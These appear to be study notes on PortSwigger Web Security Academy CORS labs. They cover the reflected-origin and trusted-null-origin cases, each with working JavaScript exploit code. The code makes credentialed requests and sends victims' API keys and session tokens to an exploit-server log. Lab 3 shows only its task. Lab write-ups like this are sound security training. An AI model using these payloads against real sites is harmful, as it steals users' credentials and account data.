## Lab - 1: CORS vulnerability with basic origin reflection

- This website has an insecure CORS configuration in that it trusts all origins. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

- account credentials contains at `/accountDetails` endpoint and test this endpoint for CORS

```
GET /accountDetails HTTP/1.1
Host: 0a7c000b04e72c9cc058415000db0089.web-security-academy.net
Origin: https://example.com
...
===============
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
...
```

- at the exploit server body,

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open(
    "get", // https: need to add to get answer
    "https://0a7c000b04e72c9cc058415000db0089.web-security-academy.net/accountDetails",
    true
  );
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location = "/log?key=" + this.responseText;
  }
</script>
```

- then Store, Deliver exploit to victim and see in Access log

```
GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22CBgteSXcN474mPgbt7nJhso6fPfHEAJc%22,%20%20%22sessions%22:%20[%20%20%20%20%22gqzp7W2o4E70TYIzIZMpN8UmGL9Nh3Q9%22%20%20]} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.61 Safari/537.36"
```

---

## Lab - 2: CORS vulnerability with trusted null origin (A)

- This website has an insecure CORS configuration in that it trusts the "null" origin. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. You can log in to your own account using the following credentials: wiener:peter

- test with steps same as lab 1
- `Origin: https://abc` doesn't return `Access-Control-Allow-Origin`
- `Origin: null` return
- in exploit server's body

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://0a25008603ef933ec0f03a1200a20064.web-security-academy.net/accountDetails',true);
req.withCredentials = true; 
req.send();
function reqListener() {
location = 'https://exploit-0a7a0075036c934fc0c83a9d010000aa.exploit-server.net/log?key='+this.responseText;
};
</script>"
></iframe>
```

---

## Lab - 3: CORS vulnerability with trusted insecure protocols (P)

- This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. You can log in to your own account using the following credentials: wiener:peter
